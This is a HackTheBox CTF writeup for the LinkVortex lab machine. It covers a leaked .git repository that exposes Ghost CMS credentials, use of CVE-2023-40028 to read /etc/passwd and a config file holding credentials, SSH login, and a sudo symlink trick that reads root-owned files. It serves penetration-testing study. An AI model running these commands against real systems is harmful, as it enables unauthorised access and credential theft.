---
title: "LinkVortex"
date: 2026-02-21
draft: false
description: "HackTheBox LinkVortex writeup"
tags: ["hackthebox", "htb", "linux", "easy", "oscp", "tjnull", "lains-list"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# LinkVortex

## Overview

- **OS:** Linux
- **IP:** 10.129.231.194
- **Difficulty:** Easy
- **Platform:** HackTheBox
- **OSCP:** Yes
- **Lists:** TJNull, Lain's List

### Summary

Enumeration uncovered a DEV subdomain exposing a `.git` directory. Dumping the repository revealed valid Ghost CMS credentials, which gave authenticated access to the admin panel. Since the target was running Ghost 5.58, I used CVE-2023-40028 to read sensitive files and recover credentials for another user. From there, I logged in as `bob` over SSH and abused a vulnerable sudo symlink-cleaning script to read root-owned files.

## Loot

| Category | Details |
|----------|---------|
| Usernames | admin@linkvortex.htb, bob@linkvortex.htb |
| Passwords | OctopiFociPilfer45, thisissupersafe, fibber-talented-worth |
| Credentials | admin@linkvortex.htb:OctopiFociPilfer45, bob@linkvortex.htb:fibber-talented-worth |
| Service Versions | Ghost 5.58 |

## Enumeration

### Nmap

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-21 07:40 EST
...
```

### Dirbusting

```bash
301 GET ...
...
```

### Web (Port 80)

#### Homepage

The web root looked like a normal blog-style site at first glance. Nothing obvious was exposed here, but it strongly suggested a CMS-backed application.

{{< figure src="image 420.png" >}}

#### CMS Detection

Further checks confirmed the backend was **Ghost CMS**, which is important because version-specific Ghost vulns are well documented.

{{< figure src="image 421.png" >}}
{{< figure src="image 422.png" >}}

#### Robots.txt

```txt
User-agent: *
Disallow: /ghost/
```

The `/ghost/` path is the Ghost admin endpoint, so this was a direct lead.

#### Ghost Admin Panel

Browsing to `/ghost/` reached the login portal.

{{< figure src="image 423.png" >}}

#### RSS Feed

The RSS data confirmed the instance was running **Ghost 5.58**, a vulnerable version for authenticated arbitrary file read.

## Subdomain Discovery

{{< figure src="image 424.png" >}}

A new subdomain was identified during enumeration. Since it was not publicly resolvable, it was added to `/etc/hosts` for direct interaction.

### DEV Subdomain

{{< figure src="image 425.png" >}}

The DEV host expanded the attack surface and quickly became the more interesting target.

#### .git Exposure

The DEV site exposed a `.git` directory. That usually means source history leakage and potential credential disclosure.

{{< figure src="image 426.png" >}}

The repository was dumped using `gitdumper` for offline review.

### Git Analysis

Commit history exposed a password update:

```diff
- password = 'thisissupersafe'
+ password = 'OctopiFociPilfer45'
```

This gave valid Ghost admin credentials.

## Exploitation

### Ghost 5.58 - Arbitrary File Read (CVE-2023-40028)

The target version was vulnerable to authenticated file read:

https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028

{{< figure src="image 427.png" >}}

#### Exploit Execution

```bash
./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb/
```

This confirmed arbitrary file read worked with the recovered admin credentials.

#### Reading System Files

```bash
/etc/passwd
```

Reading `/etc/passwd` validated file access on the target.

#### Extracting Credentials

```bash
/var/lib/ghost/config.production.json
```

Recovered credentials:

```txt
bob@linkvortex.htb
fibber-talented-worth
```

## SSH Access

```bash
ssh bob@linkvortex.htb
```

Using the credentials from `config.production.json`, I gained a shell as `bob`.

## Privilege Escalation

### Sudo Permissions

```bash
(ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

### Vulnerability

`clean_symlink.sh` did not safely validate symlink targets, making it possible to pivot a permitted `.png` path into protected files.

### Exploit

```bash
ln -s /root/root.txt /home/bob/.cache/b
ln -s /home/bob/.cache/b /home/bob/.cache/a.png

CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /home/bob/.cache/a.png
```

This abuse chain allowed reading root-owned content through the allowed sudo command.

## Root Access

{{< figure src="image 429.png" >}}

## Key Takeaways

- Exposed `.git` repositories can leak sensitive credentials via commit history.
- Old credentials can remain visible even after password rotations.
- Ghost 5.58 is vulnerable to authenticated arbitrary file read (CVE-2023-40028).
- Application config files often contain high-value credentials.
- Poor symlink handling in sudo-allowed scripts can lead to privilege escalation.
